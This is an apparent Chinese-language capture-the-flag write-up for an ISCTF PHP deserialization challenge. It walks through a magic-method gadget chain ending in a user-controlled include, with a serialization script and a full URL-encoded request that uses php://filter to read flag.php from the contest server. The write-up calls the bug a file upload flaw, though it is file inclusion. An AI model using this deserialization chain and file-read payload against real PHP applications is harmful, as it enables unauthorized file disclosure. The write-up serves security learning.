---
title: ISCTF wp
date: 2023-11-25 14:46:57
tags: PHP 反序列化
description: ISCTF 圣杯战争 wp
---
# 圣杯战争
## 解题思路
```php
<?php
class artifact{
    public $excalibuer;
    public $arrow;
    public function __toString(){
        echo "为Saber选择了对的武器!<br>";
        return $this->excalibuer->arrow;
    }
}

class prepare{
    public $release;
    public function __get($key){
        $functioin = $this->release;
        echo "蓄力!咖喱棒！！<br>";
        return $functioin();
    }
}
class saber{
    public $weapon;
    public function __invoke(){
        echo "胜利！<br>";
        echo $this->weapon;
        include($this->weapon);
    }
}
class summon{
    public $Saber;
    public $Rider;

    public function __wakeup(){
        echo "开始召唤从者！<br>";
        echo $this->Saber;
    }
}

if(isset($_GET['payload'])){ 
    unserialize($_GET['payload']); 
}
?>

```
在`suber`class中存在文件上传漏洞，但是需要调用`__invoke`方法才能触发，即需要对该class进行函数调用（`suber()`）。由`unserialize`搜索反序列化如何触发该漏洞

观察代码，思考如何利用`prepare` class 中的`$functioin`函数进行上述漏洞所在函数的触发,即调用 `__get`魔术方法

> 调用 `__get`魔术方法条件为：当调用或设置一个类及其父类方法中未定义或者私有的属性时这个方法会被触发。
观察`prepare` class 中的属性均为 public，思考如何调用未定义属性

观察`artifact` class 中的代码，考虑通过调用该 class 中的`__toString`函数，在该函数中存在`$this->excalibuer->arrow`，而`excalibuer`是 public 成员，所以通过设置该成员为`prepare`，在调用`__toString`函数时，即可完成调用未定义属性的操作。

接下来思考如何调用`__toString`魔术方法。
> PHP 5.2.0 之前，toString () 方法只有在直接使用于 echo 或 print 时才能生效。PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 printf ()，使用 % s 修饰符），但不能用于非字符串环境（如使用 % d 修饰符）。自 PHP 5.2.0 起，如果将一个未定义 toString () 方法的对象转换为字符串，会产生 E_RECOVERABLE_ERROR 级别的错误。

要利用echo 调用`__toString`魔术方法，观察代码中只有`summon`class中 echo 了`$this->Saber`，搜索如何调用`__wakeup`魔术方法。

> 当我们执行 serialize() 和 unserialize() 对对象进行操作是时，会分别调用`__sleep`和`__wakeup`这两个方法。

由此，调用链构造完成。
使用上述调用链对summon进行序列化：
```php
$mysummon=new summon();
$myartifact=new artifact();
$myprepare=new prepare();
$mysaber=new saber();
$mysaber->weapon='php://filter/read=convert.base64-encode/resource=flag.php';
$mysummon->Saber=$myartifact;
$myartifact->excalibuer=$myprepare;
$myprepare->release=$mysaber;
$a=serialize($mysummon);
echo $a;
```
之后构造 poc，注意 poc 的内容要进行 url 编码：
```
GET /?payload=O:6:%22summon%22:2:%7Bs:5:%22Saber%22%3BO:8:%22artifact%22:2:%7Bs:10:%22excalibuer%22%3BO:7:%22prepare%22:1:%7Bs:7:%22release%22%3BO:5:%22saber%22:1:%7Bs:6:%22weapon%22%3Bs:57:%22php:%2F%2Ffilter%2Fread=convert.base64-encode%2Fresource=flag.php%22%3B%7D%7Ds:5:%22arrow%22%3BN%3B%7Ds:5:%22Rider%22%3BN%3B%7D%0A
 HTTP/1.1
Host: 43.249.195.138:21234
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://43.249.195.138:21234/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: td_cookie=1749215879
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
```


